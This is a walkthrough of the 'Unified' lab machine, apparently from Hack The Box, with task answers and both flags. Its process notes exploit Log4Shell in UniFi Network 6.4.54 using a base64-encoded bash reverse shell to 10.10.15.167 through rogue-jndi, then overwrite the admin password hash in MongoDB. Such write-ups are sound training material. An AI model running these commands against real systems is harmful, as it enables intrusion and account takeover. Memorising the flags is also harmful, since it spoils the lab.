# Unified

> Task 1 -  Which are the first four open ports?

```
22,6789,8080,8443
```

> Task 2 -  What is the title of the software that is running running on port 8443? 

```
UniFi Network
```

> Task 3 -  What is the version of the software that is running?

```
6.4.54
```

> Task 4 -  What is the CVE for the identified vulnerability? 
- google `UniFi 6.4.54 exploit`

```
CVE-2021-44228
```

> Task 5 -  What protocol does JNDI leverage in the injection? 

```
ldap
```

> Task 6 - What tool do we use to intercept the traffic, indicating the attack was successful? 

```
tcpdump
```

> Task 7 -  What port do we need to inspect intercepted traffic for? 

```
389
```

> Task 8 -  What port is the MongoDB service running on? 

```
27117
```

> Task 9 -  What is the default database name for UniFi applications? 

```
ace
```

> Task 10 - What is the function we use to enumerate users within the database in MongoDB?

```
db.admin.find()
```

> Task 11 -  What is the function we use to update users within the database in MongoDB?

```
db.admin.update()
```

> Task 12 -  What is the password for the root user?

```
NotACrackablePassword4U2022
```

> Submit user flag

```
6ced1a6a89e666c0620cdb10262ba127
```

> Submit root flag

```
e50bc93c75b634e4b272d2f771c33681
```

## Process

```
go to 8443, search exploits, it's log4j vulnerable via jndi env pass through
check how it's logging in to /api/login, 
create script to call passing in suppliable payload, callback ip and endpoint
  passing in jndi override to check call back, call with payload
    ./jndi.sh $IP 10.10.15.167 payloads/jndi.json >> test_ldap_callback
    tcp --> sudo tcpdump -i utun3 port 389
  ding ding, it does call back
build/use rogue-jndi
  mvn clean install
create payload to do a tcp callback
   echo -n 'bash -c "bash -i >&/dev/tcp/10.10.15.167/9999 0>&1"' | base64 > b64_rev
run rogue-jndi
  java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyAiYmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE1LjE2Ny85OTk5IDA+JjEi}|{base64,-d}|{bash,-i}" --hostname 10.10.15.167
call payload with port as rogue-jndi && start nc listen on 9999
  ./jndi.sh $IP 10.10.15.167:1389 payloads/jndi.json "o=tomcat"
boom rev shell
  cd /home/michael && cat user.txt --> 6ced1a6a89e666c0620cdb10262ba127
ps -ef and dig around mongo process
update admin creds
  mongo --port 27117, list all users, db.admin.find().forEach(printjson);
    mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
  make new pwd for admin
    https://www.mkpasswd.net/index.php, crypt-sha512, ChickenNuggets129
      $6$5c./VGPEZfAzaWkY$KaBswNMFkOUXeera2xjZHflYoZaKdzQl8LfpdLRncDKm1rQso4LuaG/lfFPnzAhA01kBxKdBjnj1LH9ZEnyY51
  set admin user pwd to new hash
     mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$5c./VGPEZfAzaWkY$KaBswNMFkOUXeera2xjZHflYoZaKdzQl8LfpdLRncDKm1rQso4LuaG/lfFPnzAhA01kBxKdBjnj1LH9ZEnyY51"}})'
login to unifi portal with administrator:ChickenNuggets129
  under site -> ssh, you can get the root pwd in plaintext lol --> NotACrackablePassword4U2022
ssh root, cat root.txt
```
